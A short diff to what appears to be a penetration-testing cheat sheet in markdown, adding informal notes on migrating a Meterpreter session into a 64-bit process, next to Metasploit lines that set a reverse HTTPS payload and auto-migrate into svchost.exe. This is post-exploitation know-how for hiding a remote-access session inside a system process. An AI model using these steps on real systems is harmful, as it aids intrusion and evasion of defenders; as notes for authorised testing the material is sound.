@@ -1335,6 +1335,8 @@ set payload windows/x64.meterpreter/reverse_https
 ```
 ##### Migrate
 ```bash
+ps -to get the 64 mid pid
+Meterpreter shell - just do "migrate [PID that is 64 bit]
 set AutoRunScript post/windows/manage/migrate
 set AutoRunScript migrate -N svchost.exe
 svchost.exe
